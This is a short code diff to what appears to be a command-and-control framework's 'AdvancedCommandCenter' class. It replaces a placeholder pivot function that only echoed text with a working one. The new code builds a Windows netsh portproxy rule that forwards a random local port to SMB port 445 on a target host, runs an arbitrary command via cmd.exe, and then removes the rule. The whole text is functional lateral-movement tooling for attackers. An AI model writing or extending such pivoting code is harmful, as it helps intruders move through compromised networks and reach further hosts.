@@ -523,8 +523,13 @@ class AdvancedCommandCenter:
         return task
     
     def _create_pivot_wrapper(self, command: str, target: str) -> str:
-        """Create pivot wrapper command."""
-        return f"echo 'Pivot to {target}: {command}'"
+        """Create real pivot wrapper command using native OS port forwarding."""
+        # Windows: use netsh interface portproxy for native pivoting
+        lport = random.randint(30000, 50000)
+        return (f"netsh interface portproxy add v4tov4 listenport={lport} "
+                f"connectport=445 connectaddress={target} && "
+                f"cmd.exe /c \"{command}\" && "
+                f"netsh interface portproxy delete v4tov4 listenport={lport}")
     
     def clear_pivot_chain(self):
         """Clear pivot chain."""
